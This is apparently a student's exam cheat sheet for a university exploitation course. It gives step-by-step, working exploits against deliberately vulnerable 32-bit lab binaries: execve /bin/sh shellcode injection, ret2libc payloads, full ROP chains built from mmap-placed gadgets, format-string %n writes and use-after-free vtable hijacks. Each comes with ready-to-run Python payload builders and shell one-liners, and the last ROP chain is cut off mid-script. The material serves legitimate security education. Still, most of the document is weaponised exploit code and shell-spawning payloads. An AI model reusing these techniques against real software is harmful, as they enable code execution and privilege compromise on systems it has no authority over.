# EPL326 Quiz — Software Attacks Cheat Sheet

> Quiz is performed **directly on the lab machines (room 103)**. No personal laptops allowed.
> For remote access from home see [SSH_SETUP.md](SSH_SETUP.md).

---

## ⚠️ NEXT QUIZ — WHAT TO EXPECT (ROP focused)

> **This quiz will focus on Return-Oriented Programming (ROP) and mmap-based gadget chains.**
> The previous quiz (Quiz 3) covered shellcode + ret2libc + control-flow redirect. This one escalates.

**Based on all solved sets — realistic expectations:**

| Binary | Most likely | Reasoning |
|--------|-------------|-----------|
| bin.0 | PIE warm-up — skip | Consistent this year (lefteris/nektarios/kyriaki/2026-g3) |
| bin.1 | NX on → **mmap ROP** or ret2libc | ROP not tested this year yet |
| bin.2 | RWE → **shellcode** | bin.2 was shellcode in EVERY solved set, both years |
| bin.3 | NX on → **mmap ROP** (different gadget table from bin.1) | Pattern from 1048972 and out4 set B |

**Still possible — do not assume:**
- All bins could be ret2libc/shellcode (happened in last year's regina/tasos sets)
- Offsets will differ from all previous sets — always read `lea -0xNN(%ebp)` fresh per binary

**Start here — 4 commands that classify any binary:**
```bash
readelf -l ./bin.X | grep GNU_STACK         # RW=NX on, RWE=shellcode
readelf -h ./bin.X | grep Type              # ET_DYN=PIE (skip), ET_EXEC=fixed
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb"
objdump -d ./bin.X | grep "int.*0x80"       # ROP needs this
```

Then: RWE → shellcode · RW+no mmap → ret2libc · RW+mmap+movb → mmap ROP (Section 6 STEP 2)

---

## ENVIRONMENT SETUP (do this FIRST — no help given during quiz)

### On the lab machine (room 103), run once per session:

```bash
# 1. Create ~/.gdbinit
cat > ~/.gdbinit << 'EOF'
unset environment
set env TEMP=1000
set exec-wrapper setarch i686 -R -3
EOF

# 2. Create run.sh in your working directory (lab machines may have it at ./scripts/run.sh already)
cat > run.sh << 'EOF'
#!/bin/sh
env -i TEMP=1000 setarch i686 -R --3gb $@
EOF
chmod +x run.sh
# Note: the PDF says -3 which is the --3gb flag, and -R = --addr-no-randomize
```

**ALWAYS** run binaries via `run.sh` or inside gdb with the `.gdbinit` above — otherwise ASLR randomizes addresses and attacks will fail.

---

## QUICK REFERENCE — ATTACK TYPES

| Attack | Vulnerability | Key flag | Binary |
|--------|--------------|----------|--------|
| Control-flow redirect | `strcpy` overflow → overwrite ret addr | `-fno-stack-protector` | stack-smash0 |
| Shellcode injection | overflow → ret addr → shellcode on stack | `-z execstack` | stack-smash2 |
| **Ret2libc** | overflow → ret addr → `system("/bin/sh")` | NX on, no canary | bin.1, bin.3, bin.4 |
| ROP chain | overflow → chain of gadgets | no execstack needed | rop |
| Format string | `printf(user_input)` → leak / write | none | string-fmt |
| UAF + vtable hijack | `delete` then `malloc` same slot → overwrite vtable ptr | none | uaf |
| Warm-up bin.0 | `memcpy(stack_buf, heap_buf, size)` — no bounds check | execstack (RWE) | bin.0 |

---

## 1. ENVIRONMENT RECON — WHAT PROTECTIONS ARE ON?

```bash
# Check NX / execstack / RELRO / canary / PIE
readelf -l ./binary | grep GNU_STACK   # RWE = executable stack (no NX)
readelf -h ./binary | grep Type        # ET_EXEC = no PIE, ET_DYN = PIE
file ./binary                          # "not stripped" = symbols present
objdump -d ./binary | grep stack_chk   # if present → stack canary
# checksec is NOT installed on lab machine — use readelf above
```

Key flags:
- `GNU_STACK RWE` → stack is executable → shellcode injection works
- `GNU_STACK RW` (not executable) → NX on → **try ret2libc first, then ROP**
- `ET_EXEC` + `-no-pie` → fixed addresses → no ASLR worry
- `not stripped` → function names visible in gdb/objdump

---

## 2. GDB WORKFLOW — FIND BUFFER OFFSET

```bash
gdb ./binary
(gdb) disas authenticate_root      # or any vulnerable function
(gdb) b *0xADDRESS                  # break after the dangerous call (strcpy/memcpy)
(gdb) r AAAAAAAAAA                  # run with test input

# After hitting breakpoint — inspect the stack:
(gdb) x/32xw $ebp-32               # show 32 words around ebp

# Look for:
#   Your 'A' bytes (0x41414141)
#   Marker values like 0xdeadbeef
#   Saved EBP
#   Return address (points into main or libc)

# Count bytes from start of buffer to return address:
# offset = (distance from buffer start to saved EBP) + 4
```

### Finding offset fast with a cyclic pattern:

```bash
python3 -c "import string; pat=''.join([c*4 for c in string.ascii_uppercase]); print(pat)"
# AAAABBBBCCCCDDDD...  — each unique 4-byte block tells you where the overflow hit
```

---

## 3. STACK BUFFER OVERFLOW — CONTROL-FLOW REDIRECT

**Source:** [stack-smash0.c](stack-smash0.c)  
**Compile:** `gcc -Wall -no-pie -fno-pic -m32 -fno-stack-protector stack-smash0.c -o stack-smash0`

### Goal: redirect return address to skip password check

```
Stack layout (authenticate_root):
  [buffer 16B][marker 4B][...padding...][saved EBP 4B][RET ADDR 4B]
```

1. Run in gdb with `AAAA...` until you see `0x41414141` overwrite the return address
2. Find the address you want to jump to (e.g. `printf("Welcome administrator.")` line in main)
3. Craft payload:

```bash
# Payload = padding + new_ret_addr (little-endian)
./stack-smash0 `printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x57\x85\x04\x08"`
#                        ^--- padding to fill buffer + saved EBP --^  ^ret^
```

**Finding the target address:**
```bash
(gdb) disas main
# Find the instruction AFTER the conditional check (the "Welcome administrator" printf)
# Use that address as your return address target
```

---

## 4. SHELLCODE INJECTION (CODE INJECTION)

**Source:** [stack-smash2.c](stack-smash2.c)  
**Compile:** `gcc -Wall -no-pie -fno-pic -z execstack -m32 stack-smash2.c -o stack-smash2`  
**Requires:** Stack executable (`-z execstack` / `GNU_STACK RWE`)

### Shellcode (execve /bin/sh):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
```
(23 bytes)

### Steps:

```bash
gdb ./stack-smash2
(gdb) b *0xADDR_AFTER_STRCPY
(gdb) r `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAA"`

# After breakpoint:
(gdb) x/32xw $ebp-32
# NOTE the address where your shellcode bytes start (beginning of buffer)
# That address = your new return address
```

### Payload structure:
```
[shellcode 23B][padding to reach ret][address of buffer start]
```

```bash
# Example (adjust address to what gdb shows):
./stack-smash2 `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAA\xXX\xXX\xXX\xXX"`
```

**Tips:**
- Shellcode must not contain `\x00` bytes (strcpy stops at null)
- The buffer address shown in gdb must match the ASLR-disabled runtime address
- Use `run.sh` or `.gdbinit` to keep addresses fixed

---

## 5. RET2LIBC (NX ON — EASIEST APPROACH)

**Use when:** NX is ON (`GNU_STACK RW`), no stack canary, ASLR off, no gadgets needed  
**Examples:** bin.1, bin.3, bin.4 (out4 quiz)  
**Why:** Instead of injecting shellcode, redirect return address into `system()` in libc, pass it `/bin/sh`.

### Concept:
```
Normal call:  [ret addr][saved ebp][args...]
Fake frame:   [system()][fake_ret ]["/bin/sh" addr]
              ^overwrite ret addr^
```

### Step 1 — Find addresses in gdb:
```bash
gdb ./binary
(gdb) b main
(gdb) r [any valid input]
(gdb) p system                          # prints address of system()
(gdb) find &system, +99999999, "/bin/sh"  # finds "/bin/sh" string in libc
```

### Step 2 — Craft payload (Python):
```python
import struct

offset = 52   # replace with your actual offset to ret addr
system = 0xb7dd58e0   # replace with address from gdb
binsh  = 0xb7f42de8   # replace with address from gdb

pad     = b'A' * offset
fakeret = struct.pack('<I', 0xdeadbeef)   # doesn't matter, process crashes after shell
payload = pad + struct.pack('<I', system) + fakeret + struct.pack('<I', binsh)
size    = len(payload)

with open('exploit', 'wb') as f:
    f.write(str(size).encode() + b' ' + payload)
```

### Step 3 — Launch:
```bash
echo 'id' | ./scripts/run.sh ./binary exploit
# → uid=1000(...) confirms shell execution
```

### Verify shell works:
```bash
# The process will segfault AFTER id runs (fake ret addr = 0xdeadbeef) — that is normal
# What matters is that uid= line appears before the crash
```

---

## 6. RETURN-ORIENTED PROGRAMMING (ROP)

**Use when:** NX is ON (`GNU_STACK RW`), no canary, no accessible libc (or ret2libc fails)
**Tools:** [tools/find_gadgets.py](tools/find_gadgets.py) · [tools/solve_rop_template.py](tools/solve_rop_template.py)

### Concept
Chain together small code snippets ("gadgets") already in the binary, each ending in `ret`.
No new code is injected. The CPU just follows the chain of return addresses on the stack.

**Goal:** build `execve("/bin//sh", NULL, NULL)` = int 0x80 with:
```
eax = 0xb   ebx = ptr to "/bin//sh"   ecx = 0   edx = 0
```

---

### STEP 1 — Check if ROP is even needed

```bash
readelf -l ./binary | grep GNU_STACK
# RW  = NX on → shellcode fails → try ret2libc first, then ROP
# RWE = stack executable → use shellcode instead (simpler)

objdump -d ./binary | grep "int.*0x80"
# MUST exist for execve ROP — if missing, ret2libc is your only option
```

---

### STEP 2 — Detect mmap gadget-building in main() ← DO THIS BEFORE ANYTHING ELSE

```bash
objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb|malloc"
```

**If you see `mmap` + `movb`:** the binary builds its own gadgets at runtime.
Do NOT hunt for gadgets in the binary code — they do not exist there yet.

#### How to extract movb bytes (concrete example)

Run:
```bash
objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep "movb"
```

Output looks like this:
```
 8049123:  c6 45 e8 58    movb   $0x58,-0x18(%ebp)
 8049127:  c6 45 e9 5b    movb   $0x5b,-0x17(%ebp)
 804912b:  c6 45 ea c3    movb   $0xc3,-0x16(%ebp)
 804912f:  c6 45 eb 31    movb   $0x31,-0x15(%ebp)
 8049133:  c6 45 ec c0    movb   $0xc0,-0x14(%ebp)
 8049137:  c6 45 ed c3    movb   $0xc3,-0x13(%ebp)
 ...
```

Read the **last hex value on each line** (the `$0xNN` value) in order:
```
byte +0x00 = 0x58
byte +0x01 = 0x5b
byte +0x02 = 0xc3  → gadget 0: 58 5b c3 = pop eax; pop ebx; ret
byte +0x03 = 0x31
byte +0x04 = 0xc0
byte +0x05 = 0xc3  → gadget 1: 31 c0 c3 = xor eax,eax; ret
...
```
Every 3 bytes = one gadget (2-byte instruction + `0xc3` ret).
Look up each 3-byte group in the gadget reference table below.

#### Find the hardcoded address for mmap_base

In the objdump of main(), look for the `call mmap` or `mmap@plt` call and the address pushed before it:
```bash
objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -B5 "mmap"
# Look for a push or mov with a hex address near the mmap call
# That address is the hardcoded_addr
```

#### mmap_base formula
```python
# pagesize = 0x1000
hardcoded_addr = 0x8048980   # from objdump — the address pushed before mmap call
mmap_base      = (hardcoded_addr // 0x1000 - 0x1000) * 0x1000
# Example: 0x8048980 // 0x1000 = 0x8048 → 0x8048 - 0x1000 = 0x7048 → * 0x1000 = 0x07048000

gadget_base    = mmap_base + 1000   # TEMP=1000, offset IS the TEMP value directly
# Example: 0x07048000 + 0x3e8 = 0x070483e8

# Each gadget address:
gadget_at_offset = gadget_base + byte_offset   # +0x00, +0x03, +0x06, +0x09...
```

#### Chain re-sequencing (different gadget order across binaries)

Each binary in the same quiz set may have gadgets in a **different byte order**.
The chain LOGIC is always the same — only the addresses change.

Example — same 8 gadgets, different offsets across two binaries:
```
bin.3:  +0x00=xor eax  +0x03=pop eax/ebx  +0x06=mov[ebx],eax  +0x09=xor ecx  ...
bin.4:  +0x00=pop eax/ebx  +0x03=xor eax  +0x06=mov[ebx],eax  +0x09=mov ebx,eax  ...
```

After decoding the movb table for YOUR binary, map each gadget to its offset:
```python
gb = gadget_base
G_POP_EAX_POP_EBX = gb + 0x??   # whatever offset your binary has
G_MOV_EBXPTR_EAX  = gb + 0x??
# etc — fill in from YOUR decoded table, not from any example
```
Then use `solve_rop_template.py` which takes these variables — the chain structure never changes.

#### init_data() and .bss null terminator problem

Some binaries call `init_data()` before `main()` which fills `.bss` with `0xffffffff`.
Your "/bin//sh" string needs a null byte (`0x00`) at offset +8 to terminate correctly.
If `.bss + 8` contains `0xffffffff`, execve gets "/bin//sh\xff\xff\xff\xff" → returns ENOENT silently.

**Rule: always use `mmap_base + 0x500` as writable — never `.bss` when mmap is present.**
The mmap region is zeroed by `MAP_ANONYMOUS` — guaranteed null terminator.

---

### STEP 3 — Find gadgets (standard binary, no mmap)

**Automated (fastest):**
```bash
python3 ~/326_quiz3/tools/find_gadgets.py ./binary
# Outputs: all gadget addresses + chain diagram + Python payload template
```

**Manual fallback:**
```bash
objdump -d ./binary | grep -A2 "58 5b c3"   # pop eax; pop ebx; ret
objdump -d ./binary | grep -A2 "89 03 c3"   # mov [ebx],eax; ret
objdump -d ./binary | grep -A2 "89 c3 c3"   # mov ebx,eax; ret
objdump -d ./binary | grep -A2 "31 c0 c3"   # xor eax,eax; ret
objdump -d ./binary | grep -A2 "31 c9 c3"   # xor ecx,ecx; ret
objdump -d ./binary | grep -A2 "31 d2 c3"   # xor edx,edx; ret
objdump -d ./binary | grep -A2 "b0 0b c3"   # mov al,0xb; ret
objdump -d ./binary | grep -A2 "cd 80 c3"   # int 0x80; ret
```

**Find writable address:**
```bash
readelf -S ./binary | grep -E "\.bss|\.data"
# use the address shown — pick .bss (usually zero-initialized)
# WARNING: check init_data() doesn't poison it first (see STEP 2)
```

---

### STEP 4 — Build the chain

**Using the template (copy and fill in addresses):**
```bash
cp ~/326_quiz3/tools/solve_rop_template.py ./solve_rop_binX.py
# Edit: set OFFSET, WR_ADDR, and all G_* gadget addresses
python3 ./solve_rop_binX.py
```

**Chain structure (visual):**
```
[padding OFFSET bytes]                 ← fill buffer + saved EBP
[G_POP_EAX_POP_EBX]  pop eax; pop ebx; ret
[0x6e69622f]          '/bin'  → eax
[WR_ADDR]             writable addr → ebx
[G_MOV_EBXPTR_EAX]   mov [ebx],eax; ret  → writes '/bin' to memory

[G_POP_EAX_POP_EBX]  pop eax; pop ebx; ret
[0x68732f2f]          '//sh'  → eax
[WR_ADDR+4]           writable+4 → ebx
[G_MOV_EBXPTR_EAX]   mov [ebx],eax; ret  → writes '//sh' to memory

[G_POP_EAX_POP_EBX]  pop eax; pop ebx; ret
[WR_ADDR]             writable addr → eax
[0x41414141]          dummy → ebx
[G_MOV_EBX_EAX]      mov ebx,eax; ret    → ebx = ptr to "/bin//sh"

[G_XOR_ECX_ECX]      xor ecx,ecx; ret   → ecx = 0
[G_XOR_EDX_EDX]      xor edx,edx; ret   → edx = 0
[G_XOR_EAX_EAX]      xor eax,eax; ret   → eax = 0
[G_MOV_AL_0B]        mov al,0xb; ret     → eax = 11
[G_INT_80]           int 0x80            → SYSCALL → shell!
```

---

### STEP 5 — Verify

```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./binary ./exploit.X
# → uid=9992(apieri01) ← success
```

---

### Gadget byte reference card

| Bytes | Instruction | Gadget name |
|-------|-------------|-------------|
| `58 5b c3` | pop eax; pop ebx; ret | G_POP_EAX_POP_EBX |
| `31 c0 c3` | xor eax,eax; ret | G_XOR_EAX_EAX |
| `89 03 c3` | mov [ebx],eax; ret | G_MOV_EBXPTR_EAX |
| `89 c3 c3` | mov ebx,eax; ret | G_MOV_EBX_EAX |
| `31 c9 c3` | xor ecx,ecx; ret | G_XOR_ECX_ECX |
| `31 d2 c3` | xor edx,edx; ret | G_XOR_EDX_EDX |
| `b0 0b c3` | mov al,0xb; ret | G_MOV_AL_0B |
| `cd 80 c3` | int 0x80; ret | G_INT_80 |

**Warning:** Different binaries in the same quiz set can have the **same gadgets in different order**.
Always decode fresh for each binary. Never copy gadget addresses between binaries.

---

### Common ROP failures and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| Segfault, no output | Wrong offset | Re-check `lea -0xNN(%ebp)` in display_file |
| Segfault, no output | Wrong gadget address | Re-run find_gadgets.py, verify bytes manually |
| `execve` returns -1 | .bss not null-terminated | Use mmap_base+0x500 instead of .bss |
| Shell spawns but crashes instantly | Gadgets in wrong order | Decode movb table fresh for this binary |
| Nothing runs | `int 0x80` missing | Use ret2libc instead |

---

## 7. FORMAT STRING VULNERABILITY

**Source:** [string-fmt.c](string-fmt.c)  
**Compile:** `gcc -m32 -no-pie -fno-pie string-fmt.c -o string-fmt`

### Vulnerability:
```c
printf(s);   // s is user input — NEVER do this
// Safe version: printf("%s", s);
```

### Leak stack memory:
```bash
./string-fmt "%x %x %x %x %x %x %x %x"
# Dumps stack values as hex, one per %x
```

### Leak specific stack position (direct parameter access):
```bash
./string-fmt "%6\$x"   # prints 6th argument on stack
```

### Write to memory with %n:
```bash
# %n writes the NUMBER OF BYTES PRINTED SO FAR into the pointed-to address
# Step 1: find address you want to overwrite (e.g. from marker printed by program)
# Step 2: craft format string that writes target address + uses %n
./string-fmt `printf "\xAD\xDE\x00\x00%x%x%n"`
#              ^addr in little-endian^  ^count bytes^ ^write count to that addr^
```

### Practical approach in gdb:
```bash
# Program prints marker addresses first:
# 0xff9f16bc 0xff9f16b8
# These ARE the addresses of the local variables on the stack
# Use %x until you see those values appear in output = you're reading those stack slots
./string-fmt "%x-%x-%x-%x-%x-%x"
```

---

## 8. USE-AFTER-FREE (UAF) + VTABLE HIJACKING

**Source:** [uaf.cpp](uaf.cpp)  
**Compile:** `g++ -Wall -no-pie -fno-pic -m32 uaf.cpp -o uaf`

### Vulnerability pattern:
```
1. new Object()        → heap allocated, vtable pointer at offset 0
2. object->method()    → virtual call through vtable
3. delete object       → freed, but pointer (gW) still valid
4. malloc(same size)   → gets the SAME heap chunk back
5. write to chunk      → overwrites vtable pointer
6. gW->method()        → virtual call through OUR vtable pointer
```

### Steps to exploit:
```bash
gdb ./uaf
(gdb) b *0x08049277     # break just before new AdminWelcomeMessage
(gdb) r e5ce4db216329f4f
(gdb) ni 4
(gdb) info vtbl w       # shows vtable layout
# vtable for 'WelcomeMessage' @ 0x804a0a4
# [0]: cleanup()   ← at vtable+0
# [1]: print()     ← at vtable+8  (AdminWelcomeMessage::print)
```

### Find the right offset to redirect cleanup() → AdminWelcomeMessage::print():
```bash
# vtable+0 = cleanup()  at 0x804a0a4
# vtable+4 = AdminWelcomeMessage::print() is [1] → address = vtable_addr + 4
# So pass vtable_addr+4 as argv[1] (4 bytes, little-endian)
./uaf `printf "\xa8\xa0\x04\x08"`
# This makes gW->cleanup() resolve through vtable+4 → calls print() instead
```

### Key insight:
- The first 4 bytes of the heap object = vtable pointer
- `malloc` after `delete` recycles the same address
- `strncpy(str, argv[1], 4)` overwrites exactly those 4 bytes
- Pass an address that points to the function you want called

---

## 9. WARM-UP: bin.0 — COMPLETE WORKING EXPLOIT ✓

> **SOLVED & TESTED** — shell confirmed with `id` output.

### Binary info:
- 32-bit ELF, dynamically linked, not stripped
- **Stack EXECUTABLE** (`GNU_STACK RWE`) → shellcode injection
- No PIE → fixed code addresses
- `srandom(atoi(getenv("TEMP")))` → `TEMP=1000` makes stack layout deterministic

### Input format:
```
SIZE DATA
```
`fscanf(fp, "%d ", &size)` reads integer + consumes space, then `fgetc` loop reads SIZE bytes.
```bash
echo "5 12345" > f && ./run.sh ./bin0 f
# Rendering record (size: 5): 12345
```

### Vulnerability — `display_file()` (@ 0x804928c):
```c
// Reconstructed from objdump:
int size;                           // ebp-0x38
fscanf(fp, "%d ", &size);          // reads size — NO LIMIT CHECK
char *heap = malloc(size);
for (i=0; i<size; i++) heap[i] = fgetc(fp);
char local_buf[52];                 // ebp-0x34  ← fixed 52-byte stack buffer
memcpy(local_buf, heap, size);      // ← OVERFLOW — size not bounded!
```

### Stack layout in `display_file`:
```
ebp-0x38  [ size var    4B ]
ebp-0x34  [ local_buf  52B ]  ← shellcode lands here
ebp+0x00  [ saved EBP   4B ]
ebp+0x04  [ return addr 4B ]  ← overwrite with address of local_buf
           offset = 52 + 4 = 56 bytes of padding needed
```

### Step 1 — find buffer address in gdb

Run gdb INSIDE the setarch wrapper (so stack addresses match runtime):
```bash
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb gdb ./bin0
```
```gdb
(gdb) b display_file
(gdb) r testinputfile
(gdb) b *0x0804932c          # right after memcpy call
(gdb) c
(gdb) info registers ebp     # → e.g. 0xbfffe318
                             # local_buf = EBP - 0x34 = 0xbfffe2e4
```

### Step 2 — create exploit file (professor's exact solution)

```bash
printf "60 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAABBBBCCCCAAAABBBBCCCCDDDDAAAA\xe4\xe2\xff\xbf" > file.0
```

Payload breakdown (60 bytes total):
```
"60 "                                          ← size header (fscanf reads "60", consumes space)
\x31\xc0\x50\x68\x2f\x2f\x73\x68             ← shellcode (23 bytes)
\x68\x2f\x62\x69\x6e\x89\xe3\x31
\xc9\x31\xd2\xb0\x0b\xcd\x80
AAAAABBBBCCCCAAAABBBBCCCCDDDDAAAA             ← padding (33 bytes, fills to offset 56)
\xe4\xe2\xff\xbf                              ← return address = 0xbfffe2e4 (local_buf)
```

### Step 3 — launch

```bash
./scripts/run.sh ./bin.0 file.0
```

`./scripts/run.sh` is the lab machine's wrapper — equivalent to:
```bash
env -i TEMP=1000 setarch i686 -R --3gb ./bin.0 file.0
```

### Key addresses for bin.0 (confirmed):
| Symbol | Address |
|--------|---------|
| `display_file` | `0x0804928c` |
| after `memcpy` ← **break here** | `0x0804932c` |
| `main` | `0x08049397` |
| `rnd_env` | `0x08049216` |
| `local_buf` = EBP−0x34 | `0xbfffe2e4` |

### If the address differs on the lab machine:

```bash
# In gdb, break after memcpy, read EBP:
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb gdb ./bin.0
(gdb) b *0x0804932c
(gdb) r file.0
(gdb) info registers ebp        # e.g. 0xbfffe318
# local_buf = EBP - 0x34        # e.g. 0xbfffe318 - 0x34 = 0xbfffe2e4
```

Then rebuild with the correct address (little-endian, 4 bytes):
```bash
# 0xbfffe2e4 → \xe4\xe2\xff\xbf
python3 -c "import struct; print(struct.pack('<I',0xbfffe2e4))"
```

---

## 10. OUT4 QUIZ — SOLVED EXPLOITS

> **Structure is NOT fixed across quiz sets.** The same binary names (bin.1–bin.4) can have completely different internals between quiz iterations. Always re-run recon from scratch. See both solution sets below.

> ⛔ **SECTIONS 10A–10F USE STALE WSL2 LIBC ADDRESSES — DO NOT COPY THEM**
> Last year's sets used WSL2 Ubuntu libc. This year's lab machine uses Rocky Linux libc.
> | Symbol | ❌ Old WSL2 (DO NOT USE) | ✅ Lab machine (use these) |
> |--------|--------------------------|---------------------------|
> | `system()` | `0xb7dd58e0` | `0xb7dffd30` |
> | `"/bin/sh"` | `0xb7f42de8` | `0xb7f40caa` |
> Always get fresh addresses from GDB on the lab machine: `p system` + `find &system,+99999999,"/bin/sh"`

---

### 10A. FIRST SOLUTION SET — ret2libc / shellcode (2026-04-01) ✓

> Confirmed `uid=1000`. Environment: WSL2 Ubuntu, `libc6-i386`, `setarch i686 -R --3gb`, `TEMP=1000`.

**Shared vulnerability (all 4):** `display_file` — `memcpy(local_buf[48], heap, user_size)`, no bounds check. Buffer at `ebp-0x30`, offset to ret = **52**.

#### Libc addresses (TEMP=1000, ASLR off):
| Symbol | Address |
|--------|---------|
| `system()` | `0xb7dd58e0` |
| `"/bin/sh"` in libc | `0xb7f42de8` |

**bin.1 — NX ON → ret2libc**
```python
import struct
pad = b'A' * 52
payload = pad + struct.pack('<I',0xb7dd58e0) + struct.pack('<I',0xdeadbeef) + struct.pack('<I',0xb7f42de8)
with open('exploit.1','wb') as f: f.write(b'64 ' + payload)
```

**bin.2 — RWE → shellcode injection** (buf=`0xbfffe2d8`, break at `0x8048804`)
```python
import struct
sc  = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(52-len(sc)) + struct.pack('<I',0xbfffe2d8)
with open('exploit.2','wb') as f: f.write(b'56 ' + payload)
```

**bin.3 and bin.4 — NX ON → ret2libc** (same as bin.1)
```python
import struct
pad = b'A' * 52
payload = pad + struct.pack('<I',0xb7dd58e0) + struct.pack('<I',0xdeadbeef) + struct.pack('<I',0xb7f42de8)
with open('exploit.X','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X exploit.X
# → uid=1000(andre) ...
```

---

### 10B. SECOND SOLUTION SET — Quiz3_2025/out4 (2026-04-02) ✓

> Confirmed `uid=1000` on all 4. Environment: WSL2 Ubuntu via PowerShell (`powershell.exe -Command "wsl bash script.sh"`), `libc6-i386`, `setarch i686 -R --3gb`, `TEMP=1000`.

**Key difference from 10A:** bin.3 and bin.4 have a completely different `main()` — they call `malloc` + `movb` to build ROP gadgets in a heap buffer, then `mmap()` a fixed RWX region and copy those gadgets there. The attack is NOT ret2libc but a **mmap ROP chain**.

**bin.3 and bin.4 main() structure (must read before exploiting):**
```
1. [bin.4 only] init_data() — fills BSS 0x0804a058..0x0804a0a4 with 0xffffffff
                               (skips 0x0804a060), then fills 0x0804a0a0+i with byte i
2. malloc(0x18) + movb writes → builds 24-byte gadget table in heap
3. getpagesize() + arithmetic → mmap_base = (hardcoded_addr / pagesize - 0x1000) * pagesize
4. mmap(mmap_base, 0x1000, RWX, MAP_FIXED|MAP_ANON, -1, 0)
5. memcpy(mmap_base + offset(TEMP), gadget_buf, 24) → gadgets land at deterministic address
6. display_file(argv[1]) → vulnerable memcpy overflow
```

**mmap_base calculation (TEMP=1000, pagesize=0x1000):**
| Binary | hardcoded addr in main | mmap_base |
|--------|------------------------|-----------|
| bin.3 | `0x8048980` | `0x07048000` |
| bin.4 | `0x80489ec` | `0x07048000` |

`offset(1000) = 0x3e8` → `gadget_base = 0x07048000 + 0x3e8 = 0x070483e8`

**Gadget tables — DIFFERENT ORDER in bin.3 vs bin.4 (do not reuse addresses!):**

| Offset | bin.3 bytes | bin.3 gadget | bin.4 bytes | bin.4 gadget |
|--------|-------------|--------------|-------------|--------------|
| +0x00 | `31 c0 c3` | `xor eax,eax; ret` | `58 5b c3` | `pop eax; pop ebx; ret` |
| +0x03 | `58 5b c3` | `pop eax; pop ebx; ret` | `31 c0 c3` | `xor eax,eax; ret` |
| +0x06 | `89 03 c3` | `mov [ebx],eax; ret` | `89 03 c3` | `mov [ebx],eax; ret` |
| +0x09 | `31 c9 c3` | `xor ecx,ecx; ret` | `89 c3 c3` | `mov ebx,eax; ret` |
| +0x0c | `89 c3 c3` | `mov ebx,eax; ret` | `31 c9 c3` | `xor ecx,ecx; ret` |
| +0x0f | `b0 0b c3` | `mov al,0xb; ret` | `31 d2 c3` | `xor edx,edx; ret` |
| +0x12 | `31 d2 c3` | `xor edx,edx; ret` | `b0 0b c3` | `mov al,0xb; ret` |
| +0x15 | `cd 80 c3` | `int 0x80; ret` | `cd 80 c3` | `int 0x80; ret` |

**Writable memory:**
- bin.3: use `.bss` at `0x0804a060` — zero-initialized (no init_data in bin.3), null at +8 ✓
- bin.4: **do NOT use `.bss`** — init_data fills it with `0xffffffff` → no null terminator → execve fails. Use the mmap RWX region itself: `0x07048500` (past gadgets, zeroed by MAP_ANONYMOUS) ✓

**bin.1 — NX ON → ret2libc** (same as 10A set)
```python
import struct
pad = b'A' * 52
payload = pad + struct.pack('<I',0xb7dd58e0) + struct.pack('<I',0xdeadbeef) + struct.pack('<I',0xb7f42de8)
with open('exploit.1','wb') as f: f.write(b'64 ' + payload)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 exploit.1
# → uid=1000(andre) gid=...
```

**bin.2 — RWE → shellcode injection** (buf=`0xbfffe2d8`, break at `0x80487ff`)
```python
import struct
sc  = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(52-len(sc)) + struct.pack('<I',0xbfffe2d8)
with open('exploit.2','wb') as f: f.write(b'56 ' + payload)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 exploit.2
# → uid=1000(andre) gid=...
```

**bin.3 — NX ON → mmap ROP chain** (gadget_base=`0x070483e8`, wr=`0x0804a060`)
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070483e8; wr = 0x0804a060
chain  = b'A'*52
chain += p32(gb+0x03) + b'/bin' + p32(wr)       + p32(gb+0x06)  # write "/bin"
chain += p32(gb+0x03) + b'//sh' + p32(wr+4)     + p32(gb+0x06)  # write "//sh"
chain += p32(gb+0x03) + p32(wr) + p32(0x41414141) + p32(gb+0x0c) # ebx = ptr
chain += p32(gb+0x09) + p32(gb+0x12) + p32(gb+0x00) + p32(gb+0x0f) + p32(gb+0x15)
with open('exploit.3','wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.3 exploit.3
# → uid=1000(andre) gid=...
```

**bin.4 — NX ON → mmap ROP chain** (gadget_base=`0x070483e8`, wr=`0x07048500` — mmap region!)
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070483e8; wr = 0x07048500   # mmap RWX region, zeroed — NOT .bss (init_data fills it)
chain  = b'A'*52
chain += p32(gb+0x00) + b'/bin' + p32(wr)       + p32(gb+0x06)  # write "/bin"
chain += p32(gb+0x00) + b'//sh' + p32(wr+4)     + p32(gb+0x06)  # write "//sh"
